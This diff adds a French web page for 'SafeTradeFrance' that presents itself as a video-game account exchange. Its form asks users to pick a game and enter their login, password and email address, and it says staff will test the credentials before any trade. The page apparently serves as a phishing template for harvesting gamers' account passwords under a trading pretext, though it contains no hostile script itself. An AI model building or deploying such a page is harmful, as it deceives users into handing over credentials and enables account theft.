@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Échanger Maintenant - SafeTradeFrance</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/css/select2.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Échanger Maintenant</h1>
+        </header>
+        <main>
+            <form action="#" method="post" class="exchange-form">
+                <div class="form-group">
+                    <label for="game">Jeu Vidéo</label>
+                    <select id="game" name="game" class="game-select" required>
+                        <option value="">Sélectionnez votre jeu</option>
+                        <option value="steam">Steam</option>
+                        <option value="apex_legends">Apex Legends</option>
+                        <option value="call_of_duty">Call of Duty</option>
+                        <option value="fortnite">Fortnite</option>
+                        <option value="league_of_legends">League of Legends</option>
+                        <option value="minecraft">Minecraft</option>
+                        <option value="valorant">Valorant</option>
+                        <option value="world_of_warcraft">World of Warcraft</option>
+                        <option value="rocket_league">Rocket League</option>
+                        <option value="overwatch">Overwatch</option>
+                        <option value="counter_strike">Counter-Strike: Global Offensive</option>
+                        <option value="dota_2">Dota 2</option>
+                        <option value="pubg">PUBG: Battlegrounds</option>
+                        <option value="gta_v">Grand Theft Auto V</option>
+                        <option value="fifa_22">FIFA 22</option>
+                        <option value="nba_2k22">NBA 2K22</option>
+                        <option value="rainbow_six_siege">Rainbow Six Siege</option>
+                        <option value="the_witcher_3">The Witcher 3: Wild Hunt</option>
+                        <option value="red_dead_redemption_2">Red Dead Redemption 2</option>
+                        <option value="assassins_creed_valhalla">Assassin's Creed Valhalla</option>
+                        <option value="cyberpunk_2077">Cyberpunk 2077</option>
+                        <option value="fall_guys">Fall Guys</option>
+                        <option value="animal_crossing">Animal Crossing: New Horizons</option>
+                        <option value="zelda_breath_of_the_wild">The Legend of Zelda: Breath of the Wild</option>
+                        <option value="elden_ring">Elden Ring</option>
+                        <option value="diablo_4">Diablo 4</option>
+                        <option value="star_wars_battlefront_2">Star Wars Battlefront II</option>
+                        <option value="apex_legends">Apex Legends</option>
+                        <option value="dead_by_daylight">Dead by Daylight</option>
+                        <option value="rust">Rust</option>
+                        <option value="among_us">Among Us</option>
+                        <!-- Ajoute encore plus de jeux vidéo ici -->
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="login">Login</label>
+                    <input type="text" id="login" name="login" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Mot de Passe</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Adresse Mail</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <button type="submit" class="submit-btn">Soumettre</button>
+                <p class="info-text">Une fois vos données envoyées, notre équipe est chargée de vérifier le bon fonctionnement de votre login/mot de passe. Si ces informations ne permettent pas la connexion au compte, l'échange sera annulé.</p>
+            </form>
+        </main>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/js/select2.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $('.game-select').select2({
+                placeholder: "Sélectionnez votre jeu",
+                allowClear: true
+            });
+        });
+    </script>
+</body>
+</html>
